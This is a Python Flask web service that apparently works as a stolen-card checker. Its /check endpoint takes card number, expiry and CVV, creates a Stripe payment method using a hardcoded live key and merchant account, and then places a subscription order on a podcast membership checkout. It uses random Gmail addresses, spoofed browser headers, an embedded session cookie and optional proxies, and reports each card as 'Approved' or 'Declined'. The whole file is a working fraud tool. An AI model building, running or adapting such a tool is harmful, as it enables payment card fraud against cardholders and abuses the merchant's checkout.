from flask import Flask, request, jsonify
import requests
import random
import string

app = Flask(__name__)

def random_gmail():
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8,13)))
    return f"{prefix}@gmail.com"

def get_pm_id(cc, mm, yy, cvv, email, proxies=None):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'dnt': '1',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }
    data = {
        'billing_details[email]': email,
        'billing_details[address][country]': 'IN',
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/cb8f05370a; stripe-js-v3/cb8f05370a; payment-element; deferred-intent; autopm',
        'referrer': 'https://plus.thecrimedesk.com',
        'key': 'pk_live_hQJRYWUjPLlW7MCl6AD0P3Zl',
        '_stripe_account': 'acct_1Qw4jSCWZVmBlvS9',
    }
    try:
        resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=20
        )
        j = resp.json()
        return j.get('id'), j
    except Exception as e:
        return None, {"error": str(e)}

def get_proxies(proxy_str):
    # Format: host:port:user:pass
    try:
        host, port, user, pwd = proxy_str.strip().split(':')
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    except Exception:
        return None

def parse_result(resp_json):
    success = resp_json.get('success', False)
    message = resp_json.get('message', '')
    if success and "successfully" in str(message).lower():
        status = "Approved"
    else:
        status = "Declined"
    return {
        "success": success,
        "message": message,
        "status": status
    }

@app.route('/check', methods=['GET', 'POST'])
def check():
    cc = request.values.get('cc', '').replace(' ', '')
    proxy_str = request.values.get('proxy')
    if not cc or '|' not in cc:
        return jsonify({"error": "Invalid or missing cc parameter. Format: cc|mm|yy|cvv"}), 400
    try:
        cc_num, mm, yy, cvv = cc.split('|')
    except:
        return jsonify({"error": "Invalid cc format. Use cc|mm|yy|cvv"}), 400

    proxies = get_proxies(proxy_str) if proxy_str else None
    email = random_gmail()
    pm_id, pm_json = get_pm_id(cc_num, mm, yy, cvv, email, proxies=proxies)
    if not pm_id:
        return jsonify({"success": False, "message": str(pm_json), "status": "Declined"}), 200

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://plus.thecrimedesk.com',
        'priority': 'u=1, i',
        'referer': 'https://plus.thecrimedesk.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'supportingcast-widget-publishable-key': 'wpk_SsMtim5FlLGhMCRoPDCN7kLQX9NPl7Es6QQkHmAC7yVJ09RYovSNJErIxX1vFusXsUjJ8aMJLHPbfmPIoshFUCGS1723D0Z959F',
        'supportingcast-widget-session-cookie': 'eyJpdiI6IlQ5ek55ZGZZaFNaN09ObXBCZVh5YUE9PSIsInZhbHVlIjoidkdjR1dGN2Y5eTZXN3JFbTJHay8yTTNueEJIZU93N2wvOEt4dG9iUzl3SE83QTN0MnNJV3RGd2pla0NuL04vb29EZWpDcms5L1VRR0hjeVZUYlZqRXRicVJEclRSc2NudXNCTy9TVFdYeWg2dmcwdVFzdlRQU0REZWpSSStkNjYiLCJtYWMiOiI2NzAwNDBiNjBkN2QyODA0YTYzZjZkMzYzOGIwMzcyMjAxN2IzMDRmNjc2MzM5YTVjZGM4ZDgxNjg1YmU4NjU0IiwidGFnIjoiIn0%3D',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }
    json_data = {
        "discounts": None,
        "userData": {
            "email": email,
            "firstName": "",
            "lastName": "",
            "paymentMethod": {
                "id": pm_id,
                "object": "payment_method",
                "allow_redisplay": "unspecified",
                "billing_details": {
                    "address": {
                        "city": None,
                        "country": "IN",
                        "line1": None,
                        "line2": None,
                        "postal_code": None,
                        "state": None
                    },
                    "email": email,
                    "name": None,
                    "phone": None,
                    "tax_id": None
                },
                "type": "card"
            },
            "stripeCustomerId": None
        },
        "subscriptionPlan": {
            "id": 11893,
            "name": "The Crime Desk Club",
            "benefits": {
                "benefit1": "Weekly member-only Trial+ episodes",
                "benefit2": "Ad-free listening",
                "benefit3": "Exclusive access to The Trial archive",
                "benefit4": "Early access to new shows"
            },
            "highlighted_plan_label": None,
            "prices": [
                {
                    "id": 56612,
                    "amount": 3.99,
                    "currency": "gbp",
                    "interval": "month",
                    "interval_count": "1",
                    "free_trial_interval": "Day",
                    "free_trial_interval_count": 7
                },
                {
                    "id": 56611,
                    "amount": 39.99,
                    "currency": "gbp",
                    "interval": "year",
                    "interval_count": "1",
                    "free_trial_interval": "Day",
                    "free_trial_interval_count": 30
                }
            ],
            "pwyw": False,
            "requires_address": False,
            "requires_fullname": False,
            "restricted": False,
            "annual_plan_savings": "Save 16%!",
            "selected_price_id": 56612
        },
        "products": {},
        "promoCodes": [],
        "subtotal": 3.99,
        "returnUrl": "https://plus.thecrimedesk.com/#join",
        "collectAddress": False,
        "collectFullname": False,
        "requiresPayment": True,
        "taxes": None,
        "isEmpty": False,
        "total": 3.99,
        "recaptchaToken": ""
    }
    try:
        resp2 = requests.post(
            "https://widget-api.supportingcast.fm/order",
            headers=headers,
            json=json_data,
            proxies=proxies,
            timeout=25
        )
        resp_data = resp2.json()
        result = parse_result(resp_data)
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "message": str(e), "status": "Declined"}), 200

import os
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
